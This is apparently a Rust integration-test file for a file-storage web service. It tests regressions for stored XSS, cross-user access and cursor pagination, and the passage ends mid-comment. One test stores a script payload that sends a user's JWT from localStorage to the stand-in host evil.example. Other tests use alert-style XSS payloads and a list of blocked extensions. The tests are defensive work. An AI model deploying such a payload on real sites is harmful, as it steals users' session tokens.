//! HTTP 层集成测试（crate 内，因此可以直接调用 [`crate::build_router`]）。
//!
//! 之所以需要这一层：现有 38 个测试全是单元测试（纯函数 + 临时 SQLite），
//! 而 P0 的两个缺陷都落在 handler 层——响应头策略与「哪条扩展名算可渲染」，
//! 恰好是单元测试够不到的地方。这里用 `tower::ServiceExt::oneshot` 直接对
//! 路由器发真实请求，把修复结论锁成回归测试。
//!
//! 注意：这些是**规则性断言**（例如「媒体接口绝不返回 HTML 类型」），
//! 而不是对当前实现的快照，因此后续重构只要不破坏安全不变量就不会误报。

use std::sync::Arc;
use std::time::{SystemTime, UNIX_EPOCH};
use tracing_subscriber::layer::SubscriberExt as _;

use axum::body::Body;
use axum::http::header;
use axum::http::{Request, StatusCode};
use sqlx::SqlitePool;
use tokio::sync::Semaphore;
use tower::ServiceExt;

use crate::config::Config;
use crate::services::file_service;
use crate::utils::crypto;
use crate::{build_router, AppState};

// ===========================================================================
// 测试夹具
// ===========================================================================

struct Fixture {
    pool: SqlitePool,
    config: Config,
    dir: std::path::PathBuf,
}

impl Fixture {
    /// 关闭连接池后删除临时目录。Windows 下数据库文件被占用时目录删不掉，
    /// 所以必须先 `close()`。
    async fn cleanup(self) {
        self.pool.close().await;
        let _ = std::fs::remove_dir_all(&self.dir);
    }
}

/// 每个测试用独立的临时目录 + 独立数据库，可安全并行执行。
async fn fixture(name: &str) -> Fixture {
    let unique = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    let dir = std::env::temp_dir().join(format!(
        "pan_http_test_{}_{}_{}",
        name,
        std::process::id(),
        unique
    ));
    let upload_dir = dir.join("uploads");
    std::fs::create_dir_all(&upload_dir).expect("创建测试上传目录失败");

    // 静态目录也放进临时目录：SPA 回退的行为依赖 index.html 是否存在，
    // 若指向仓库里真实构建出来的 static/（gitignore 产物、CI 上不存在），
    // 相关断言就会随环境漂移。
    let static_dir = dir.join("static");
    std::fs::create_dir_all(static_dir.join("assets")).expect("创建测试静态目录失败");
    std::fs::write(static_dir.join("index.html"), SPA_INDEX_HTML).expect("写入测试 index.html 失败");
    std::fs::write(static_dir.join("assets").join("app.js"), "console.log('asset')
")
        .expect("写入测试静态资源失败");

    let db_path = dir.join("test.db");
    let database_url = format!("sqlite:{}?mode=rwc", db_path.display());
    let pool = crate::db::init_db(&database_url)
        .await
        .expect("初始化测试数据库失败");

    let config = Config {
        server_host: "127.0.0.1".into(),
        server_port: 0,
        database_url,
        upload_dir,
        static_dir: static_dir.to_string_lossy().into_owned(),
        jwt_secret: b"0123456789abcdef0123456789abcdef".to_vec(),
        max_file_size: 1024 * 1024,
        gc_interval_sec: 0,
    };

    Fixture { pool, config, dir }
}

/// 测试用 index.html。带一个可辨识的标记串，便于断言「回退确实吐的是它」。
const SPA_INDEX_HTML: &str = "<!doctype html><html><body><div id=\"SPA-MARKER\"></div></body></html>
";

fn router(f: &Fixture) -> axum::Router {
    build_router(AppState {
        pool: f.pool.clone(),
        config: f.config.clone(),
        preview_semaphore: Arc::new(Semaphore::new(1)),
    })
}

/// 建一个用户，同时签发该用户的合法 JWT。
async fn add_user(f: &Fixture, username: &str) -> (i64, String) {
    let hash = crypto::hash_password("secret123").expect("bcrypt 失败");
    let (id,): (i64,) = sqlx::query_as(
        "INSERT INTO users (username, password_hash) VALUES (?, ?) RETURNING id",
    )
    .bind(username)
    .bind(&hash)
    .fetch_one(&f.pool)
    .await
    .expect("插入用户失败");

    let token = crypto::generate_token(id, username, &f.config).expect("签发 token 失败");
    (id, token)
}

/// 同时插入文件记录与对应的物理文件，返回 `(file_id, 物理路径)`。
///
/// 直接写库（而不是走上传接口）是刻意的：这样才能构造出「名字合法但内容危险」
/// 的存量数据，用来验证**响应侧**的防线独立于写入侧的校验。
async fn add_file(
    f: &Fixture,
    owner_id: i64,
    original_name: &str,
    content: &[u8],
) -> (i64, std::path::PathBuf) {
    let stored_name = file_service::generate_stored_filename(original_name);
    let stored_path = format!("user_{}/{}", owner_id, stored_name);
    let full_path = f.config.upload_dir.join(&stored_path);
    std::fs::create_dir_all(full_path.parent().expect("路径无父目录"))
        .expect("创建用户目录失败");
    std::fs::write(&full_path, content).expect("写入物理文件失败");

    let ext = file_service::extension_of(original_name);
    let (id,): (i64,) = sqlx::query_as(
        "INSERT INTO files (name, original_name, stored_path, owner_id, folder_id, size, file_type)
         VALUES (?, ?, ?, ?, NULL, ?, ?) RETURNING id",
    )
    .bind(original_name)
    .bind(original_name)
    .bind(&stored_path)
    .bind(owner_id)
    .bind(content.len() as i64)
    .bind(&ext)
    .fetch_one(&f.pool)
    .await
    .expect("插入文件记录失败");

    (id, full_path)
}

fn authed_get(uri: &str, token: &str) -> Request<Body> {
    Request::builder()
        .method("GET")
        .uri(uri)
        .header(header::AUTHORIZATION, format!("Bearer {}", token))
        .body(Body::empty())
        .expect("构造请求失败")
}

fn authed_json(method: &str, uri: &str, token: &str, json: &str) -> Request<Body> {
    Request::builder()
        .method(method)
        .uri(uri)
        .header(header::AUTHORIZATION, format!("Bearer {}", token))
        .header(header::CONTENT_TYPE, "application/json")
        .body(Body::from(json.to_string()))
        .expect("构造请求失败")
}

/// 取响应头（`&str` 实现了 `AsHeaderName`，查找大小写不敏感）。
fn header_of(res: &axum::response::Response, name: &str) -> String {
    res.headers()
        .get(name)
        .and_then(|v| v.to_str().ok())
        .unwrap_or("")
        .to_string()
}

/// 构造单文件 multipart 请求体。
fn multipart_body(boundary: &str, filename: &str, body: &[u8]) -> Vec<u8> {
    let mut out = Vec::new();
    out.extend_from_slice(format!("--{}\r\n", boundary).as_bytes());
    out.extend_from_slice(
        format!(
            "Content-Disposition: form-data; name=\"file\"; filename=\"{}\"\r\n",
            filename
        )
        .as_bytes(),
    );
    out.extend_from_slice(b"Content-Type: application/octet-stream\r\n\r\n");
    out.extend_from_slice(body);
    out.extend_from_slice(format!("\r\n--{}--\r\n", boundary).as_bytes());
    out
}

// ===========================================================================
// P0-1  存储型 XSS 链
// ===========================================================================

/// 回归：改名到任何「浏览器会渲染成文档」的扩展名都必须被拒。
///
/// 修复前 `rename_file` 只校验非空，于是可以「上传 x.jpg（内容为 HTML）
/// → 改名为 x.html」，绕过上传侧的扩展名校验。
#[tokio::test]
async fn rename_rejects_renderable_extensions() {
    let f = fixture("rename_ext").await;
    let (user_id, token) = add_user(&f, "alice").await;
    let (file_id, _) = add_file(&f, user_id, "photo.jpg", b"not really a jpeg").await;

    for bad in [
        "evil.html",
        "evil.htm",
        "evil.xhtml",
        "evil.svg",
        "evil.js",
        "evil.hta",
    ] {
        let req = authed_json(
            "PUT",
            &format!("/api/files/{}/rename", file_id),
            &token,
            &format!("{{\"name\":\"{}\"}}", bad),
        );
        let res = router(&f).oneshot(req).await.expect("请求失败");
        assert_eq!(
            res.status(),
            StatusCode::BAD_REQUEST,
            "改名到 {} 应被拒绝，实际返回 {}",
            bad,
            res.status()
        );
    }

    // 正常改名不能被误伤
    let req = authed_json(
        "PUT",
        &format!("/api/files/{}/rename", file_id),
        &token,
        "{\"name\":\"renamed.jpg\"}",
    );
    let res = router(&f).oneshot(req).await.expect("请求失败");
    assert_eq!(res.status(), StatusCode::OK, "正常改名不应被拒绝");

    f.cleanup().await;
}

/// 回归（核心）：媒体接口**绝不**能以 `text/html` 内联返回。
///
/// 这里直接在库里造出 `original_name = "evil.html"` 的记录，因此断言的是
/// **响应侧**的防线——它必须独立于写入侧的校验成立。修复前该分支用
/// `mime_guess(original_name)` 推导类型，对 `.html` 会得到 `text/html` + `inline`，
/// 于是攻击者可以用自己的 token 构造链接、让受害者在服务端同源下执行脚本，
/// 从而读走 `localStorage` 里的 JWT。
#[tokio::test]
async fn media_never_serves_html_inline() {
    let f = fixture("media_html").await;
    let (user_id, token) = add_user(&f, "bob").await;
    let (file_id, _) = add_file(
        &f,
        user_id,
        "evil.html",
        b"<script>fetch('//evil.example/?t='+localStorage.token)</script>",
    )
    .await;

    let res = router(&f)
        .oneshot(authed_get(&format!("/api/files/{}/media", file_id), &token))
        .await
        .expect("请求失败");

    assert_eq!(res.status(), StatusCode::OK);

    let ct = header_of(&res, "content-type");
    assert!(
        !ct.to_lowercase().contains("html"),
        "媒体接口绝不能返回 HTML 类型（同源 XSS），实际 Content-Type = {}",
        ct
    );
    assert_eq!(
        ct, "application/octet-stream",
        "不在内联白名单内的类型必须降级为 octet-stream"
    );

    let cd = header_of(&res, "content-disposition");
    assert!(
        cd.starts_with("attachment"),
        "不在内联白名单内的类型必须强制下载，实际 Content-Disposition = {}",
        cd
    );

    // 纵深防御：降级为下载时还应带 CSP 沙箱
    let csp = header_of(&res, "content-security-policy");
    assert!(
        csp.contains("sandbox"),
        "降级响应应带 CSP sandbox，实际 = {:?}",
        csp
    );

    f.cleanup().await;
}

/// 反向保障：合法图片仍要以内联方式返回真实 MIME。
/// 没有这条，把白名单写成空表也能让上面的测试通过。
#[tokio::test]
async fn media_still_serves_real_images_inline() {
    let f = fixture("media_img").await;
    let (user_id, token) = add_user(&f, "carol").await;
    let (file_id, _) = add_file(
        &f,
        user_id,
        "picture.png",
        b"\x89PNG\r\n\x1a\nnot-a-real-png",
    )
    .await;

    let res = router(&f)
        .oneshot(authed_get(&format!("/api/files/{}/media", file_id), &token))
        .await
        .expect("请求失败");

    assert_eq!(res.status(), StatusCode::OK);
    assert_eq!(
        header_of(&res, "content-type"),
        "image/png",
        "图片必须保留真实 MIME"
    );
    assert!(
        header_of(&res, "content-disposition").starts_with("inline"),
        "图片必须保持内联（否则前端 <img> 预览会失效）"
    );

    f.cleanup().await;
}

/// 上传侧：被阻止的扩展名不得落库，也不得留下物理文件。
#[tokio::test]
async fn upload_rejects_blocked_extension() {
    let f = fixture("upload_block").await;
    let (_user_id, token) = add_user(&f, "dave").await;

    let boundary = "----pantestboundary";
    let body = multipart_body(boundary, "evil.html", b"<script>alert(1)</script>");

    let req = Request::builder()
        .method("POST")
        .uri("/api/files/upload")
        .header(
            header::CONTENT_TYPE,
            format!("multipart/form-data; boundary={}", boundary),
        )
        .header(header::AUTHORIZATION, format!("Bearer {}", token))
        .body(Body::from(body))
        .expect("构造请求失败");

    let res = router(&f).oneshot(req).await.expect("请求失败");
    assert_eq!(
        res.status(),
        StatusCode::BAD_REQUEST,
        "上传 .html 必须被拒绝"
    );

    let (count,): (i64,) = sqlx::query_as("SELECT COUNT(*) FROM files")
        .fetch_one(&f.pool)
        .await
        .expect("统计失败");
    assert_eq!(count, 0, "被拒的上传不应留下文件记录");

    f.cleanup().await;
}

/// 下载路径必须始终是 `attachment`——这是「下载」与「内联预览」的分界线。
#[tokio::test]
async fn download_is_always_attachment() {
    let f = fixture("download_att").await;
    let (user_id, token) = add_user(&f, "erin").await;
    let (file_id, _) = add_file(&f, user_id, "evil.html", b"<script>alert(1)</script>").await;

    let res = router(&f)
        .oneshot(authed_get(
            &format!("/api/files/{}/download", file_id),
            &token,
        ))
        .await
        .expect("请求失败");

    assert_eq!(res.status(), StatusCode::OK);
    let cd = header_of(&res, "content-disposition");
    assert!(
        cd.starts_with("attachment"),
        "下载必须带 attachment，实际 = {}",
        cd
    );
    assert!(
        cd.contains("filename*=UTF-8''"),
        "文件名应带 RFC 5987 形式，实际 = {}",
        cd
    );

    f.cleanup().await;
}

/// 中文文件名必须走 RFC 5987 编码。
/// 交付场景里文件名普遍是中文，靠浏览器容错不是可接受的方案。
#[tokio::test]
async fn download_encodes_non_ascii_filename() {
    let f = fixture("download_cjk").await;
    let (user_id, token) = add_user(&f, "frank").await;
    let (file_id, _) = add_file(&f, user_id, "婚礼精修.jpg", b"x").await;

    let res = router(&f)
        .oneshot(authed_get(
            &format!("/api/files/{}/download", file_id),
            &token,
        ))
        .await
        .expect("请求失败");

    assert_eq!(res.status(), StatusCode::OK);
    let cd = header_of(&res, "content-disposition");
    assert!(
        cd.contains("filename*=UTF-8''%E5%A9%9A%E7%A4%BC%E7%B2%BE%E4%BF%AE.jpg"),
        "中文名必须 percent-encode 进 filename*，实际 = {}",
        cd
    );
    // ASCII 回退段必须只含可见 ASCII，否则 HeaderValue 构造会失败
    assert!(
        cd.is_ascii(),
        "Content-Disposition 必须整体是 ASCII（否则响应头构造失败），实际 = {}",
        cd
    );

    f.cleanup().await;
}

// ===========================================================================
// 越权基准（后续 P1 修复的回归位）
// ===========================================================================

/// 基准：当前已正确的越权防线——A 不得通过媒体接口读到 B 的文件。
/// 新增越权相关接口时，照这个模式补对应断言。
#[tokio::test]
async fn media_denies_cross_user_access() {
    let f = fixture("idor_media").await;
    let (alice_id, alice_token) = add_user(&f, "alice2").await;
    let (_bob_id, bob_token) = add_user(&f, "bob2").await;
    let (file_id, _) = add_file(&f, alice_id, "private.jpg", b"alice-only").await;

    // 持有者可以读
    let res = router(&f)
        .oneshot(authed_get(&format!("/api/files/{}/media", file_id), &alice_token))
        .await
        .expect("请求失败");
    assert_eq!(res.status(), StatusCode::OK);

    // 他人不可以
    let res = router(&f)
        .oneshot(authed_get(&format!("/api/files/{}/media", file_id), &bob_token))
        .await
        .expect("请求失败");
    assert_eq!(
        res.status(),
        StatusCode::NOT_FOUND,
        "他人的文件必须表现为不存在（而非 403，避免泄露存在性）"
    );

    f.cleanup().await;
}

// ===========================================================================
// 游标分页
//
// 这一组测的是**翻页语义**，不是字段快照：重点在于「翻完整个列表恰好每条一次」，
// 以及「翻页途中有新行插到列表头部时，后续页不会重复或遗漏」。
// 后者正是当初选择游标而不是 OFFSET 的原因，所以必须有测试锁住。
// ===========================================================================

/// 以指定时间戳插入文件记录（不落物理文件——这些测试只走列表接口）。
async fn add_file_at(f: &Fixture, owner_id: i64, name: &str, uploaded_at: &str) -> i64 {
    let (id,): (i64,) = sqlx::query_as(
        "INSERT INTO files (name, original_name, stored_path, owner_id, folder_id, size, file_type, uploaded_at)
         VALUES (?, ?, ?, ?, NULL, ?, ?, ?) RETURNING id",
    )
    .bind(name)
    .bind(name)
    .bind(format!("user_{}/{}", owner_id, file_service::generate_stored_filename(name)))
    .bind(owner_id)
    .bind(1024i64)
    .bind("jpg")
    .bind(uploaded_at)
    .fetch_one(&f.pool)
    .await
    .expect("插入文件记录失败");
    id
}

/// 批量插入 `count` 个文件。`same_second = true` 时全部落在同一秒 ——
/// 这是批量上传的真实形态，也是 keyset 分页最容易出错的地方
/// （排序键并列时若没有 id 兜底，翻页会漏项或重复）。
async fn seed_files_at(f: &Fixture, owner_id: i64, count: usize, same_second: bool, prefix: &str) {
    for i in 0..count {
        let ts = if same_second {
            "2026-09-26 13:00:00".to_string()
        } else {
            format!("2026-09-26 13:{:02}:{:02}", i / 60, i % 60)
        };
        add_file_at(f, owner_id, &format!("{}{:04}.jpg", prefix, i), &ts).await;
    }
}

async fn json_body(res: axum::response::Response) -> serde_json::Value {
    let bytes = axum::body::to_bytes(res.into_body(), usize::MAX)
        .await
        .expect("读取响应体失败");
    serde_json::from_slice(&bytes).expect("响应不是合法 JSON")
}

async fn body_text(res: axum::response::Response) -> String {
    let bytes = axum::body::to_bytes(res.into_body(), usize::MAX)
        .await
        .expect("读取响应体失败");
    String::from_utf8_lossy(&bytes).into_owned()
}

/// 按游标翻完一个列表接口，返回 `(按顺序的 id 序列, 页数, 接口报告的总数)`。
///
/// `base_uri` 必须自带查询串（内部用 `&cursor=` 追加）。
async fn walk_pages(f: &Fixture, base_uri: &str, token: &str) -> (Vec<i64>, usize, i64) {
    let mut ids = Vec::new();
    let mut cursor: Option<String> = None;
    let mut pages = 0usize;
    let mut total = None;

    loop {
        let uri = match &cursor {
            Some(c) => format!("{}&cursor={}", base_uri, c),
            None => base_uri.to_string(),
        };
        let res = router(f)
            .oneshot(authed_get(&uri, token))
            .await
            .expect("请求失败");
        assert_eq!(res.status(), StatusCode::OK, "翻页请求失败: {uri}");

        let body = json_body(res).await;
        let data = &body["data"];

        if total.is_none() {
            // /api/files 用 total，/api/trash 与 /api/search 用 total_files
            total = data
                .get("total")
                .or_else(|| data.get("total_files"))
                .and_then(|v| v.as_i64());
        }

        let rows = data["files"].as_array().expect("files 不是数组");
        for row in rows {
            ids.push(row["id"].as_i64().expect("id 不是数字"));
        }

        pages += 1;
        assert!(pages < 100, "分页没有收敛，可能是游标没有推进");

        match data["next_cursor"].as_str() {
            Some(c) if !c.is_empty() => cursor = Some(c.to_string()),
            _ => return (ids, pages, total.expect("响应里没有 total / total_files")),
        }
    }
}

/// 按接口返回的顺序查询期望的 id 序列（即「数据库认为的正确全序」）。
async fn expected_file_order(f: &Fixture, owner_id: i64) -> Vec<i64> {
    let rows: Vec<(i64,)> = sqlx::query_as(
        "SELECT id FROM files WHERE owner_id = ? AND folder_id IS NULL AND deleted_at IS NULL
         ORDER BY uploaded_at DESC, id DESC",
    )
    .bind(owner_id)
    .fetch_all(&f.pool)
    .await
    .expect("查询期望顺序失败");
    rows.into_iter().map(|(id,)| id).collect()
}

fn assert_complete_and_unique(seen: &[i64], expected: &[i64], label: &str) {
    let seen_set: std::collections::HashSet<i64> = seen.iter().copied().collect();
    let expected_set: std::collections::HashSet<i64> = expected.iter().copied().collect();
    assert_eq!(
        seen.len(),
        seen_set.len(),
        "{label}: 出现重复项（{} 条里有 {} 个重复）—— 游标没有正确推进",
        seen.len(),
        seen.len() - seen_set.len()
    );
    let missing: Vec<i64> = expected_set.difference(&seen_set).copied().collect();
    assert!(
        missing.is_empty(),
        "{label}: 漏掉了 {} 条（如 {:?}）—— 通常是缺了 id 兜底导致并列行次序不定",
        missing.len(),
        &missing[..missing.len().min(5)]
    );
}

#[tokio::test]
async fn files_pagination_walks_every_row_once() {
    let f = fixture("page_files_all").await;
    let (user_id, token) = add_user(&f, "pager").await;

    // 全部落在同一秒：并列最严重的情况
    seed_files_at(&f, user_id, 25, true, "same").await;
    let expected = expected_file_order(&f, user_id).await;

    let (seen, pages, total) = walk_pages(&f, "/api/files?limit=10", &token).await;
    assert_eq!(total, 25, "首页报告的 total 必须是过滤后的总条数");
    assert_eq!(pages, 3, "25 条按每页 10 条应为 3 页，实际 {pages}");
    assert_complete_and_unique(&seen, &expected, "同秒并列的文件列表");
    // 顺序本身也要对：翻页结果应与单次查询的顺序完全一致
    assert_eq!(seen, expected, "翻页结果的顺序与单次查询不一致");

    f.cleanup().await;
}

#[tokio::test]
async fn files_pagination_survives_concurrent_upload() {
    let f = fixture("page_files_insert").await;
    let (user_id, token) = add_user(&f, "pager").await;
    seed_files_at(&f, user_id, 25, false, "old").await;
    let original = expected_file_order(&f, user_id).await;

    // 取第一页
    let res = router(&f)
        .oneshot(authed_get("/api/files?limit=10", &token))
        .await
        .expect("请求失败");
    let body = json_body(res).await;
    let first_page: Vec<i64> = body["data"]["files"]
        .as_array()
        .unwrap()
        .iter()
        .map(|r| r["id"].as_i64().unwrap())
        .collect();
    let cursor = body["data"]["next_cursor"]
        .as_str()
        .expect("第一页应给出 next_cursor")
        .to_string();
    assert_eq!(first_page.len(), 10);

    // 翻页途中有人上传了一个更新的文件 —— 它会排到列表最前面。
    // 用 OFFSET 时这一步会让后续所有窗口平移一格，第 2 页的第一条与第 1 页的最后一条重复。
    add_file_at(&f, user_id, "during.jpg", "2026-09-27 09:00:00").await;

    // 继续翻完
    let mut seen = first_page.clone();
    let mut cur = Some(cursor);
    while let Some(c) = cur {
        let res = router(&f)
            .oneshot(authed_get(&format!("/api/files?limit=10&cursor={}", c), &token))
            .await
            .expect("请求失败");
        assert_eq!(res.status(), StatusCode::OK);
        let body = json_body(res).await;
        for row in body["data"]["files"].as_array().unwrap() {
            seen.push(row["id"].as_i64().unwrap());
        }
        cur = body["data"]["next_cursor"]
            .as_str()
            .filter(|s| !s.is_empty())
            .map(|s| s.to_string());
    }

    // 不重复 —— 这是游标相对 OFFSET 的核心收益
    let seen_set: std::collections::HashSet<i64> = seen.iter().copied().collect();
    assert_eq!(
        seen.len(),
        seen_set.len(),
        "翻页途中插入新文件后出现重复项（{} 条里有 {} 个重复）—— 这是 OFFSET 的典型症状",
        seen.len(),
        seen.len() - seen_set.len()
    );
    // 原有 25 条一条不许少
    assert_complete_and_unique(&seen, &original, "翻页途中插入新文件");
    // 新行排在头部、落在已翻过的第 1 页范围内，因此不会被补回来 ——
    // 这是游标的既定语义（不回头补已经看过的部分），不是缺陷。
    assert_eq!(seen.len(), 25, "新插入的行不应被回补到后续页");
    assert!(!seen_set.contains(&expected_file_order(&f, user_id).await[0]),
        "新插入的行本就不该出现在后续页里");

    f.cleanup().await;
}

#[tokio::test]
async fn files_pagination_rejects_malformed_cursor() {
    let f = fixture("page_files_badcursor").await;
    let (_user_id, token) = add_user(&f, "pager").await;

    for bad in [
        "cursor=not-a-cursor",
        "cursor=v1.uploaded_at.abc.61",       // id 不是数字
        "cursor=v1.uploaded_at.42.zz",        // 非 hex
        "cursor=v2.uploaded_at.42.61",        // 版本不符
        "cursor=v1.wrong_sort.42.61",         // 排序标识不匹配
    ] {
        let res = router(&f)
            .oneshot(authed_get(&format!("/api/files?limit=10&{}", bad), &token))
            .await
            .expect("请求失败");
        assert_eq!(
            res.status(),
            StatusCode::BAD_REQUEST,
            "坏游标必须返回 400 而不是静默从头开始：{bad}"
        );
    }

    // 空串要当「没有游标」，不能报错 —— 前端把「没有更多」表达成空串
    let res = router(&f)
        .oneshot(authed_get("/api/files?limit=10&cursor=", &token))
        .await
        .expect("请求失败");
    assert_eq!(res.status(), StatusCode::OK, "空游标应视为首页");

    f.cleanup().await;
}

#[tokio::test]
async fn files_pagination_clamps_limit() {
    let f = fixture("page_files_limit").await;
    let (user_id, token) = add_user(&f, "pager").await;
    seed_files_at(&f, user_id, 3, true, "few").await;

    // 超过上限必须被夹住，否则 ?limit=999999999 就等于取消了分页
    let res = router(&f)
        .oneshot(authed_get("/api/files?limit=999999999", &token))
        .await
        .expect("请求失败");
    assert_eq!(res.status(), StatusCode::OK);
    let body = json_body(res).await;
    assert_eq!(
        body["data"]["limit"].as_i64(),
        Some(crate::utils::pagination::MAX_LIMIT),
        "limit 必须被夹到上限"
    );

    // 0 与负数能解析成 i64，按「未指定」处理 → 回落到默认值
    for bad in ["limit=0", "limit=-5"] {
        let res = router(&f)
            .oneshot(authed_get(&format!("/api/files?{}", bad), &token))
            .await
            .expect("请求失败");
        assert_eq!(res.status(), StatusCode::OK, "非正 limit 不应报错：{bad}");
        let body = json_body(res).await;
        assert_eq!(
            body["data"]["limit"].as_i64(),
            Some(crate::utils::pagination::DEFAULT_LIMIT),
            "非正 limit 应回落到默认值：{bad}"
        );
    }

    // 不是数字则在 Query 反序列化阶段就失败，返回 400。
    // 这是刻意的：调用方写错了参数应当明确报错，而不是被静默忽略。
    let res = router(&f)
        .oneshot(authed_get("/api/files?limit=abc", &token))
        .await
        .expect("请求失败");
    assert_eq!(res.status(), StatusCode::BAD_REQUEST, "limit 非数字应返回 400");

    f.cleanup().await;
}

#[tokio::test]
async fn files_pagination_is_scoped_to_owner() {
    let f = fixture("page_files_scope").await;
    let (alice, alice_token) = add_user(&f, "alice").await;
    let (bob, _bob_token) = add_user(&f, "bob").await;
    seed_files_at(&f, alice, 12, true, "alice").await;
    seed_files_at(&f, bob, 30, true, "bob").await;

    let (seen, _pages, total) = walk_pages(&f, "/api/files?limit=5", &alice_token).await;
    assert_eq!(total, 12, "total 必须只统计自己的文件");
    assert_eq!(seen.len(), 12, "只能翻到自己的 12 条");

    // 拿 alice 的游标、却猜 bob 的数据是取不到的（游标里没有 owner 信息，
    // owner 永远来自鉴权，所以篡改游标只能改变起点，取不到别人的数据）
    f.cleanup().await;
}

#[tokio::test]
async fn files_list_response_shape_is_stable() {
    let f = fixture("page_shape").await;
    let (user_id, token) = add_user(&f, "pager").await;
    seed_files_at(&f, user_id, 2, true, "s").await;

    let res = router(&f)
        .oneshot(authed_get("/api/files", &token))
        .await
        .expect("请求失败");
    let body = json_body(res).await;

    // 字段名是前后端契约的一部分：前端拿不到 next_cursor 只会静默停止加载，
    // 不会报错，所以这里把字段锁住。
    for key in ["files", "total", "has_more", "next_cursor", "limit"] {
        assert!(
            body["data"].get(key).is_some(),
            "/api/files 的 data 缺少字段 {key}"
        );
    }
    assert!(body["data"]["files"].is_array());
    assert_eq!(body["data"]["has_more"].as_bool(), Some(false));
    assert!(body["data"]["next_cursor"].is_null(), "没有下一页时应为 null");

    f.cleanup().await;
}

#[tokio::test]
async fn trash_pagination_walks_every_row_once() {
    let f = fixture("page_trash").await;
    let (user_id, token) = add_user(&f, "pager").await;
    seed_files_at(&f, user_id, 23, true, "keep").await;
    seed_files_at(&f, user_id, 23, true, "del").await;

    // 把带 del 前缀的 23 条软删除，删除时间全部相同（同一批删除）
    sqlx::query("UPDATE files SET deleted_at = '2026-09-26 13:00:02' WHERE original_name LIKE 'del%'")
        .execute(&f.pool)
        .await
        .expect("软删除失败");

    let expected: Vec<i64> = sqlx::query_as::<_, (i64,)>(
        "SELECT id FROM files WHERE owner_id = ? AND deleted_at IS NOT NULL
         ORDER BY deleted_at DESC, id DESC",
    )
    .bind(user_id)
    .fetch_all(&f.pool)
    .await
    .unwrap()
    .into_iter()
    .map(|(id,)| id)
    .collect();
    assert_eq!(expected.len(), 23);

    let (seen, pages, total) = walk_pages(&f, "/api/trash?limit=10", &token).await;
    assert_eq!(total, 23, "/api/trash 的 total_files 必须是回收站里的文件数");
    assert_eq!(pages, 3);
    assert_complete_and_unique(&seen, &expected, "回收站（同一批删除，deleted_at 全部相同）");

    f.cleanup().await;
}

#[tokio::test]
async fn search_pagination_works_for_every_sort() {
    let f = fixture("page_search_sorts").await;
    let (user_id, token) = add_user(&f, "pager").await;

    // 制造大量并列：全部同一秒 + 只有 3 种文件名 + 只有 3 种大小
    for i in 0..60 {
        let (id,): (i64,) = sqlx::query_as(
            "INSERT INTO files (name, original_name, stored_path, owner_id, folder_id, size, file_type, uploaded_at)
             VALUES (?, ?, ?, ?, NULL, ?, 'jpg', '2026-09-26 13:00:00') RETURNING id",
        )
        .bind(format!("img{}.jpg", i % 3))
        .bind(format!("orig{}.jpg", i % 3))
        .bind(format!("user_{}/{}.jpg", user_id, i))
        .bind(user_id)
        .bind(1000i64 + (i % 3) * 1000)
        .fetch_one(&f.pool)
        .await
        .unwrap();
        let _ = id;
    }

    // 六种「排序字段 × 方向」组合都必须能完整翻完
    for (sort, order) in [
        ("uploaded_at", "desc"),
        ("uploaded_at", "asc"),
        ("name", "asc"),
        ("name", "desc"),
        ("size", "asc"),
        ("size", "desc"),
    ] {
        let uri = format!(
            "/api/search?q=jpg&sort={}&order={}&limit=10",
            sort, order
        );
        let (seen, pages, total) = walk_pages(&f, &uri, &token).await;
        assert_eq!(total, 60, "{sort} {order}: total_files 应为 60");
        assert!(pages >= 6, "{sort} {order}: 60 条按每页 10 条应至少 6 页");

        let seen_set: std::collections::HashSet<i64> = seen.iter().copied().collect();
        assert_eq!(
            seen.len(),
            seen_set.len(),
            "{sort} {order}: 翻页出现重复（{} 条里有 {} 个重复）",
            seen.len(),
            seen.len() - seen_set.len()
        );
        assert_eq!(
            seen.len(),
            60,
            "{sort} {order}: 只翻到 {} 条，应为 60 条 —— 并列行缺 id 兜底时就会这样",
            seen.len()
        );
    }

    f.cleanup().await;
}

#[tokio::test]
async fn search_rejects_cursor_from_another_sort() {
    let f = fixture("page_search_xcursor").await;
    let (user_id, token) = add_user(&f, "pager").await;
    seed_files_at(&f, user_id, 10, true, "s").await;

    let res = router(&f)
        .oneshot(authed_get("/api/search?q=jpg&sort=name&order=asc&limit=5", &token))
        .await
        .expect("请求失败");
    let body = json_body(res).await;
    let cursor = body["data"]["next_cursor"]
        .as_str()
        .expect("应给出 next_cursor")
        .to_string();

    // 同一个游标配同一排序：OK
    let res = router(&f)
        .oneshot(authed_get(
            &format!("/api/search?q=jpg&sort=name&order=asc&limit=5&cursor={}", cursor),
            &token,
        ))
        .await
        .expect("请求失败");
    assert_eq!(res.status(), StatusCode::OK, "同排序同方向的游标应被接受");

    // 换了排序字段：必须拒绝
    let res = router(&f)
        .oneshot(authed_get(
            &format!("/api/search?q=jpg&sort=size&order=asc&limit=5&cursor={}", cursor),
            &token,
        ))
        .await
        .expect("请求失败");
    assert_eq!(res.status(), StatusCode::BAD_REQUEST, "换排序字段后旧游标必须被拒");

    // 只换方向（asc → desc）：也必须拒绝。升序与降序的遍历方向相反，
    // 只校验字段名的话这里会静默通过，返回位置错误的一批结果。
    let res = router(&f)
        .oneshot(authed_get(
            &format!("/api/search?q=jpg&sort=name&order=desc&limit=5&cursor={}", cursor),
            &token,
        ))
        .await
        .expect("请求失败");
    assert_eq!(
        res.status(),
        StatusCode::BAD_REQUEST,
        "只换排序方向时旧游标也必须被拒 —— 游标里的排序标识必须含方向"
    );

    f.cleanup().await;
}

// ===========================================================================
// 公网暴露前的越权修复回归测试（2026-09-27）
// ---------------------------------------------------------------------------
// 背景：把服务挂到公网前逐条复核出 9 处越权/隐私缺陷（见 DEPLOY_RECHECK.md）。
// 这些缺陷在局域网内影响有限，域名一旦公开即可被直接利用，因此每条都要有
// 一个「先失败后通过」的接口测试把它们锁死。
//
// 断言写成**行为式**的（「B 不能通过 A 这条路拿到 X」）而不是快照式的，
// 这样后续重构只要不破坏安全不变量就不会误报。
// ===========================================================================

/// 让某个账号过期。
async fn expire_user(f: &Fixture, user_id: i64) {
    sqlx::query("UPDATE users SET expires_at = '2000-01-01 00:00:00' WHERE id = ?")
        .bind(user_id)
        .execute(&f.pool)
        .await
        .expect("设置过期时间失败");
}

// ---------------------------------------------------------------------------
// 媒体访问凭证：?ticket=<media ticket> 旁路
// ---------------------------------------------------------------------------
//
// 缩略图 <img> 与下载 <a download> 带不了 Authorization 头，所以凭据只能走
